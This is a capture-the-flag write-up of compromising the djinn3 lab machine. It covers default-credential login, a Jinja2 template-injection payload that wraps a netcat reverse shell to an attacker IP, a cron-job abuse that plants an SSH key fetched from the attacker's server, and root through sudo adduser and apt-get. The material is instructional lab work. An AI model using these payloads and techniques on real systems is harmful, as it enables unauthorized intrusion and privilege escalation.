# PG Play: [djinn3](https://portal.offensive-security.com/labs/play)

![image](https://user-images.githubusercontent.com/87611022/180659095-75dc4574-0a14-4866-8756-cae67ee8616a.png)


We start our information gathering by port scanning the machine:
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)
|   256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)
|_  256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)
80/tcp    open  http    lighttpd 1.4.45
|_http-title: Custom-ers
|_http-server-header: lighttpd/1.4.45
5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
31337/tcp open  Elite?
```
We can see four ports open so let's start exploring them one by one.

**Port 80: http**

nothing much going on as it appears to be a static page with blank links and [dirb](https://www.kali.org/tools/dirb/) didn't find anything.

![image](https://user-images.githubusercontent.com/87611022/181829893-e32b6fd7-cfa7-402d-9897-178b02a39c8f.png)


**Port 5000: http**

The webpage on port 5000 seems a lot more interesting

![image](https://user-images.githubusercontent.com/87611022/181830400-86e97a3e-b8f4-451f-93a7-816cd9f11abe.png)


it looks like it's some sort of a ticket management system with a headline (in red) indicating that it's vulnerable.

we can also notice from the tickets that default credentials are not removed from the management system

**Port 31337: Elite?**

This port hosts an unknown application which requires authentication, I assume this is the application that manages the tickets on port 5000, we also know that default credentials are valid on this App we just need to know what Are the default credentials :D

After trying several combinations these creds are valid: (guest:guest).

We login and list the commands

```
┌──(root💀kali)-[~/tryhackme/rooms/djinn3]
└─# nc 192.168.124.102 31337
username> guest
password> guest

Welcome to our own ticketing system. This application is still under 
development so if you find any issue please report it to mail@mzfr.me

Enter "help" to get the list of available commands.

> help

        help        Show this menu
        update      Update the ticketing software
        open        Open a new ticket
        close       Close an existing ticket
        exit        Exit
    
> 

```
Let's open our own ticket and check the web page if it's listed there.

```
┌──(root💀kali)-[~/tryhackme/rooms/djinn3]
└─# nc 192.168.124.102 31337
username> guest
password> guest

> open
> Title: shawarma
Description: man
> 

┌──(root💀kali)-[~/tryhackme/rooms/djinn3]
└─# curl -s "http://192.168.124.102:5000/?id=3098"

        <html>
            <head>
            </head>

            <body>
                <h4>shawarma</h4>
                <br>
                <b>Status</b>: open
                <br>
                <b>ID</b>: 3098
                <br>
                <h4> Description: </h4>
                <br>
                man
            </body>
             <footer>
              <p><strong>Sorry for the bright page, we are working on some beautiful CSS</strong></p>
             </footer> 
        </html>
```

After some enumeration and looking for possible exploits I found out that the service is vulnerable to Server Side Template Injection [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection):
```
┌──(root💀kali)-[~/tryhackme/rooms/djinn3]
└─# nc 192.168.124.102 31337
username> guest
password> guest

> open
Title: idk    
Description: {{7*7}}
>                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/rooms/djinn3]
└─# curl "http://192.168.124.102:5000/?id=3718"                                                                                                                                                                                          1 ⨯

        <html>
            <head>
            </head>

            <body>
                <h4>idk</h4>
                <br>
                <b>Status</b>: open
                <br>
                <b>ID</b>: 3718
                <br>
                <h4> Description: </h4>
                <br>
                49
            </body>
             <footer>
              <p><strong>Sorry for the bright page, we are working on some beautiful CSS</strong></p>
             </footer> 
        </html>

```
I tried several language-specific payloads to identify the template engine and came to the conclusion that the engine is jinja2.

I downloaded a payload list and used this Python script to create tickets with the payloads:

```
from pwn import *

host, port = '192.168.124.102', 31337

s = remote(host, port)

s.recvuntil('username> ')
s.sendline('guest')

s.recvuntil('password> ')
s.sendline('guest')

with open('payloads.txt') as f:
	payloads = f.readlines()

for i, payload in enumerate(payloads):

	s.recvuntil('> ')
	s.sendline('open')

	s.recvuntil('Title: ')
	s.sendline('test{}'.format(i))

	s.recvuntil('Description: ')
	s.sendline('{}'.format(payload))

s.close()	
```
several payloads worked but this seemed the most convenient to use: `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`

Next I used this command to get a shell: 
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.124 4444 >/tmp/f`

the full payload looks like this:
`{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.124 4444 >/tmp/f').read()}}`

We start a listener and send the payload and we get a shell

```
┌──(root💀kali)-[~]
└─# nc -nlvp 4444       
listening on [any] 4444 ...
connect to [192.168.49.124] from (UNKNOWN) [192.168.124.102] 48934
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We enumerate the machine for possible privilege escalation paths and found these two compiled python files

```
www-data@djinn3:/opt$ ls -la
ls -la
total 24
drwxr-xr-x  4 root     root     4096 Jun  4  2020 .
drwxr-xr-x 23 root     root     4096 Sep 30  2020 ..
-rwxr-xr-x  1 saint    saint    1403 Jun  4  2020 .configuration.cpython-38.pyc
-rwxr-xr-x  1 saint    saint     661 Jun  4  2020 .syncer.cpython-38.pyc
``` 

We download the files to our machine and use a tool like uncompyle6 to decompile the files:

**configuration.cpython-38.pyc:**
```
┌──(root💀kali)-[~/tryhackme/rooms/djinn3]
└─# uncompyle6 configuration.cpython-38.pyc 

# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Warning: this version of Python has problems handling the Python 3 "byte" type in constants properly.

# Embedded file name: configuration.py
# Size of source mod 2**32: 1343 bytes

import os, sys, json
from glob import glob
from datetime import datetime as dt

class ConfigReader:
    config = None

    @staticmethod
    def read_config(path):
        """Reads the config file
 """
        config_values = {}
        try:
            with open(path, 'r') as (f):
                config_values = json.load(f)
        except Exception as e:
            try:
                print("Couldn't properly parse the config file. Please use properl")
                sys.exit(1)
            finally:
                e = None
                del e

        else:
            return config_values

    @staticmethod
    def set_config_path():
        """Set the config path
 """
        files = glob('/home/saint/*.json')
        other_files = glob('/tmp/*.json')
        files = files + other_files
        try:
            if len(files) > 2:
                files = files[:2]
            else:
                file1 = os.path.basename(files[0]).split('.')
                file2 = os.path.basename(files[1]).split('.')
                if file1[(-2)] == 'config':
                    if file2[(-2)] == 'config':
                        a = dt.strptime(file1[0], '%d-%m-%Y')
                        b = dt.strptime(file2[0], '%d-%m-%Y')
                if b < a:
                    filename = files[0]
                else:
                    filename = files[1]
        except Exception:
            sys.exit(1)
        else:
            return filename
# okay decompiling configuration.cpython-38.pyc
```

**syncer.cpython-38.pyc:**
```
from configuration import *
from connectors.ftpconn import *
from connectors.sshconn import *
from connectors.utils import *

def main():
    """Main function
 Cron job is going to make my work easy peasy
 """
    configPath = ConfigReader.set_config_path()
    config = ConfigReader.read_config(configPath)
    connections = checker(config)
    if 'FTP' in connections:
        ftpcon(config['FTP'])
    else:
        if 'SSH' in connections:
            sshcon(config['SSH'])
        else:
            if 'URL' in connections:
                sync(config['URL'], config['Output'])

if __name__ == '__main__':
    main()
# okay decompiling syncer.cpython-38.pyc
```

Analyzing the source files we can assume that there's a cron job running by the user saint that executes `Syncer.py` and the comment in the source file confirms it.

We are a little short on details but here is what we know:
* there is a cronjob that executes `syncer.py`
* The program lists all json files in `/tmp` directory
* The program will look for the most recent file which name is based on the date format and copy the content of the file indicated by the `URL` in the json file to the location indicated by `OUTPUT` by the same file

So I created this json file with the current date and uploaded it to the `/tmp` directory on the victim machine:

```
┌──(root💀kali)-[~/.ssh]
└─# nano 29-07-2022.config.json
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/.ssh]
└─# cat 29-07-2022.config.json     
{
    "URL": "http://192.168.49.124:8000/id_rsa.pub",
    "Output": "/home/saint/.ssh/authorized_keys"
}
```
I started an http server and waited for a connection:

```
┌──(root💀kali)-[~/.ssh]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.124.102 - - [29/Jul/2022 15:03:33] "GET /29-07-2022.config.json HTTP/1.1" 200 -
```
Now that our Id_rsa is in the authorized_keys we can SSH to the Victim machine as the user `saint`

```
┌──(root💀kali)-[~/.ssh]
└─# ssh saint@192.168.124.102

saint@djinn3:~$
```

I used Linpeas to enumerate this user and found out that `saint` can use the command `adduser` as root:
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                  
Matching Defaults entries for saint on djinn3:                                                                                                                                                                                               
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saint may run the following commands on djinn3:
    (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
```

also by looking at the sudoers file we can see that there is an entry for a deleted user named `jason` which can run `apt-get` as root:
```
User jason may run the following commands on djinn3:
    (root) PASSWD: /usr/bin/apt-get
```

So let's recreate this `jason` user and use it's sudo privileges to get a root shell:

```
saint@djinn3:/tmp$ sudo adduser jason --gid=0
Adding user `jason' ...
Adding new user `jason' (1003) with group `root' ...
Creating home directory `/home/jason' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for jason
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] y
saint@djinn3:/tmp$ su jason
Password: 
jason@djinn3:/tmp$
```

from [GTFOBINS](https://gtfobins.github.io/gtfobins/apt-get/#sudo) we can use this command to get a root shell with apt-get:

```
jason@djinn3:/tmp$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

And that's the end of this box I hope you found this writeup helpful and thanks for reading through it :D
